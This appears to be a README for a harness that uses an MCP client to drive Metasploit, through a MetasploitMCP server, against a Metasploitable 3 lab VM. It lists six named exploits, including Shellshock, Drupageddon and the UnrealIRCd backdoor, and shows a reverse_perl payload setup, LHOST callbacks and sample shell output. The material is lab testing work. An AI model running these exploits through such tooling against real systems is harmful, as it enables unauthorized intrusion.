# Metasploitable 3 Test Harness - Getting Started

## What Is This?

A **comprehensive integration testing tool** that acts as an MCP client to test the MetasploitMCP server against real vulnerable targets. This is a **full MCP client implementation** that validates the entire stack works correctly.

## 🎯 Purpose

This harness:
- ✅ **Tests the REAL MCP Server** - Not mocks, not stubs, the actual server
- ✅ **Uses the REAL MCP Protocol** - HTTP JSON-RPC calls to `/mcp`
- ✅ **Hits REAL Targets** - Exploits actual Metasploitable 3 vulnerabilities
- ✅ **Validates End-to-End** - From MCP client → MCP server → Metasploit → Target
- ✅ **Reports Real Results** - Session creation, command execution, timing

## 🚀 Quick Start

### Option 1: Direct MetasploitMCP (Standalone)

```bash
# 1. Start Metasploit RPC (Terminal 1)
msfrpcd -P mypassword -S -a 127.0.0.1 -p 55553

# 2. Start MetasploitMCP Server (Terminal 2)
export MSF_PASSWORD=mypassword
poetry run python MetasploitMCP.py --transport http --host 127.0.0.1 --port 8085

# 3. Run Test (Terminal 3) - NO --gateway flag
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4
```

### Option 2: ExploitMCP Gateway (Integrated)

```bash
# 1. Start Metasploit RPC (Terminal 1)
msfrpcd -P mypassword -S -a 127.0.0.1 -p 55553

# 2. Start ExploitMCP Gateway (Terminal 2)
cd /path/to/exploitmcp
export MSF_PASSWORD=mypassword
poetry run python -m src.exploitmcp.mcps.gateway --port 5555

# 3. Run Test (Terminal 3) - WITH --gateway flag
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --mcp-url http://localhost:5555 \
    --gateway
```

## 📋 What You Need

1. **Metasploitable 3 VM** running (Linux version)
2. **Network connectivity** between your machine and the VM
3. **Metasploit Framework** installed
4. **This repository** with dependencies installed (`poetry install`)

## 🎨 What Gets Tested

The harness includes **6 exploit tests** from the Metasploitable 3 walkthrough:

| Test | What It Does | Port | User |
|------|--------------|------|------|
| ProFTPD ModCopy | Exploits FTP service | 21/80 | www-data |
| Apache Shellshock | Bash injection in CGI | 80 | www-data |
| Drupal Drupageddon | SQL injection → RCE | 80 | www-data |
| phpMyAdmin RCE | Authenticated exploit | 80 | www-data |
| Rails ActionPack | ERB template injection | 3500 | chewbacca |
| UnrealIRCd Backdoor | IRC backdoor | 6697 | boba_fett |

## 📚 Documentation Structure

We've created **3 levels** of documentation:

### 1. **Quick Start** (5 minutes)
→ **Read**: `docs/QUICK_START_TESTING.md`  
→ **For**: Getting running fast

### 2. **Setup Guide** (10 minutes)
→ **Read**: `INTEGRATION_TEST_SETUP.md`  
→ **For**: Step-by-step walkthrough with troubleshooting

### 3. **Complete Reference** (Full details)
→ **Read**: `docs/METASPLOITABLE3_TESTING.md`  
→ **For**: Deep dive, customization, CI/CD integration

## 🎮 How to Use

### List Available Tests
```bash
make list-metasploitable3-tests
```

### Run Quick Test (Single Exploit)
```bash
make test-metasploitable3-quick TARGET=10.0.2.15 LHOST=10.0.2.4
```

### Run All Tests
```bash
make test-metasploitable3 TARGET=10.0.2.15 LHOST=10.0.2.4
```

### Run Specific Test
```bash
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --test "ProFTPD ModCopy Exec"
```

### Verbose Mode (For Debugging)
```bash
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --verbose
```

### Skip Session Cleanup (Keep Existing Sessions)
```bash
# By default, the harness kills all active sessions before running tests to free up ports
# Use --no-cleanup to preserve existing sessions
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --no-cleanup
```

## 🧹 Automatic Session Cleanup

**By default**, the harness automatically cleans up all active Metasploit sessions **AND handler jobs** before running tests. This:
- ✅ **Terminates all sessions** (even from previous runs)
- ✅ **Kills handler jobs** that keep ports bound after session termination
- ✅ **Frees up ports** that were bound by previous sessions
- ✅ **Prevents port conflicts** when tests try to bind to LPORT
- ✅ **Ensures clean state** for each test run

**Example cleanup output:**
```
Cleaning up all active sessions to free ports...
Found 2 active session(s) to terminate
Terminating session 1...
✓ Session 1 terminated successfully
Terminating session 2...
✓ Session 2 terminated successfully
Session cleanup complete: 2/2 terminated
Killing all handler jobs to release ports...
✓ Killed 2 handler job(s)
Waiting 2 seconds for ports to be released...
```

**What gets cleaned up:**
- ✅ **Sessions**: All active Metasploit sessions are terminated
- ✅ **Handler Jobs**: All exploit/multi/handler jobs are killed  
- ✅ **Ports**: All bound ports (LPORT) are completely released

**To disable cleanup** (if you want to preserve existing sessions):
```bash
--no-cleanup
```

## 🔍 What It Looks Like

### Successful Test Output
```
================================================================================
Testing: ProFTPD ModCopy Exec
Description: ProFTPD 1.3.5 Mod_Copy Command Execution
Module: exploit/unix/ftp/proftpd_modcopy_exec
Payload: cmd/unix/reverse_perl
================================================================================
Executing exploit...
Exploit execution result: {'success': True, 'data': 'Session 1 opened'}
Detected session ID: 1
Session command result: {'success': True, 'data': 'uid=33(www-data)'}
✓ Test PASSED - Session established (ID: 1)
```

### Summary Report
```
################################################################################
TEST SUMMARY
################################################################################

Total Tests: 6
Passed: 5 ✓
Failed: 1 ✗
Success Rate: 83.3%
Total Duration: 42.35s

Detailed Results:
--------------------------------------------------------------------------------
✓ PASS | ProFTPD ModCopy Exec (7.23s)
      Session ID: 1
      User Info: uid=33(www-data) gid=33(www-data)
✓ PASS | Apache Shellshock (8.45s)
      Session ID: 2
      User Info: uid=33(www-data) gid=33(www-data)
...
```

## 🛠️ Testing the Harness Itself

The harness has **comprehensive unit tests** that don't require a real target:

```bash
# Run harness unit tests
make test-harness

# With coverage
poetry run pytest tests/test_metasploitable3_harness.py --cov -v
```

**Test Coverage**: 92%+ with all major scenarios covered.

## 🏗️ Architecture

```
Your Command
     │
     ├─→ metasploitable3_test_harness.py (MCP Client)
     │   ├─→ HTTP POST to http://127.0.0.1:8085/mcp
     │   ├─→ JSON-RPC: {"method": "tools/call", "params": {...}}
     │   └─→ Parses responses and detects sessions
     │
     ├─→ MetasploitMCP.py (MCP Server)
     │   ├─→ Receives tool calls via FastMCP
     │   ├─→ Translates to pymetasploit3 calls
     │   └─→ Returns results via MCP protocol
     │
     ├─→ msfrpcd (Metasploit RPC)
     │   ├─→ Receives RPC calls
     │   ├─→ Executes exploit modules
     │   └─→ Manages sessions
     │
     └─→ Metasploitable 3 VM (Target)
         └─→ Gets exploited, returns shell
```

## 💡 Key Features

- ✅ **Full MCP Protocol**: Complete JSON-RPC implementation
- ✅ **Async/Await**: Modern async Python throughout
- ✅ **Automatic Cleanup**: Kills all active sessions AND handler jobs before tests to completely free ports
- ✅ **Session Detection**: Automatically finds session IDs
- ✅ **Session Verification**: Runs commands to verify sessions work
- ✅ **Timing Metrics**: Tracks how long each test takes
- ✅ **Error Handling**: Comprehensive error messages
- ✅ **Configurable**: Target, LHOST, LPORT, MCP URL, cleanup behavior
- ✅ **Extensible**: Easy to add new exploit tests

## 📊 Files Created

```
MetasploitMCP/
├── metasploitable3_test_harness.py          # Main harness (777 lines)
├── tests/test_metasploitable3_harness.py    # Unit tests (520+ lines)
├── examples/metasploitable3_quicktest.sh     # Quick test script
├── docs/
│   ├── METASPLOITABLE3_TESTING.md          # Complete reference
│   └── QUICK_START_TESTING.md              # Quick start guide
├── INTEGRATION_TEST_SETUP.md                # Setup walkthrough
├── HARNESS_SUMMARY.md                       # Implementation summary
└── METASPLOITABLE3_HARNESS_README.md       # This file
```

## 🔧 Customization

### Adding New Tests

Edit `metasploitable3_test_harness.py`:

```python
def get_exploit_tests(self) -> List[ExploitTest]:
    return [
        # ... existing tests ...
        ExploitTest(
            name="My New Exploit",
            description="What it does",
            module="exploit/path/to/module",
            payload="payload/type",
            options={
                "RHOSTS": self.target_ip,
                "RPORT": "8080",
                "LHOST": self.lhost,
                "LPORT": str(self.lport),
            },
            expected_user="username",
            notes="Any special notes"
        ),
    ]
```

### Custom Behavior

Subclass the harness:

```python
class MyHarness(Metasploitable3TestHarness):
    async def run_single_test(self, test: ExploitTest) -> TestResult:
        # Custom pre-test logic
        logger.info("Custom setup...")
        
        # Run the test
        result = await super().run_single_test(test)
        
        # Custom post-test logic
        if result.success:
            logger.info("Custom cleanup...")
        
        return result
```

## 🚨 Common Issues & Solutions

### "Connection refused to http://127.0.0.1:8085"
**Fix**: Start the MCP server:
```bash
poetry run python MetasploitMCP.py --transport http --host 127.0.0.1 --port 8085
```

### "Failed to connect to Metasploit RPC"
**Fix**: Start msfrpcd:
```bash
msfrpcd -P mypassword -S -a 127.0.0.1 -p 55553
export MSF_PASSWORD=mypassword
```

### "Exploit ran but no session detected"
**Fix**: Check network connectivity:
```bash
# From Metasploitable 3, ping your LHOST
ssh vagrant@10.0.2.15
ping YOUR_LHOST
```

## 🎓 Learning the Code

### MCP Client Implementation

```python
# Clean JSON-RPC implementation
async def call_tool(self, tool_name: str, arguments: Dict[str, Any]):
    request_data = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": tool_name,
            "arguments": arguments
        }
    }
    
    response = await self.client.post(self.mcp_endpoint, json=request_data)
    return response.json()
```

### Session Detection

```python
# Automatically finds session IDs from exploit output
import re
session_match = re.search(r'session[s]?\s+(\d+)', result_data, re.IGNORECASE)
if session_match:
    session_id = int(session_match.group(1))
```

## 📖 Documentation Roadmap

1. **First Time?** → Start with `docs/QUICK_START_TESTING.md`
2. **Need Help?** → Check `INTEGRATION_TEST_SETUP.md`
3. **Going Deep?** → Read `docs/METASPLOITABLE3_TESTING.md`
4. **Customizing?** → See extension sections in any guide
5. **CI/CD?** → See CI/CD section in full documentation

## ⚠️ Security Warning

**This tool performs REAL exploitation attacks.**

- ✅ Only use in authorized testing environments
- ✅ Never use against systems you don't own
- ✅ Ensure proper network isolation
- ✅ You are responsible for ensuring authorization

Unauthorized access to computer systems is illegal.

## 🎯 Success Metrics

This harness provides:
- ✅ **Real Integration Testing** - Not mocks, real exploits
- ✅ **Full Stack Validation** - MCP → Metasploit → Target
- ✅ **Reproducible Results** - Automated, consistent
- ✅ **Clear Reporting** - Success/failure with details
- ✅ **Easy Extension** - Add new tests easily

## 🤝 Contributing

Want to add more exploit tests? See the "Extending the Harness" section in `docs/METASPLOITABLE3_TESTING.md`.

## 📞 Need Help?

1. Check the troubleshooting sections in the docs
2. Run with `--verbose` to see detailed logs
3. Review the example scripts in `examples/`
4. Check the summary in `HARNESS_SUMMARY.md`

## 🎉 You're Ready!

Pick a guide and get started:

- 🏃 **Fast**: `docs/QUICK_START_TESTING.md`
- 🚶 **Thorough**: `INTEGRATION_TEST_SETUP.md`
- 🧑‍🏫 **Complete**: `docs/METASPLOITABLE3_TESTING.md`

**Or just run**:
```bash
make test-metasploitable3-quick TARGET=10.0.2.15 LHOST=10.0.2.4
```

---

**Status**: ✅ Complete and Ready to Use  
**Version**: 1.0.0  
**Last Updated**: October 2025

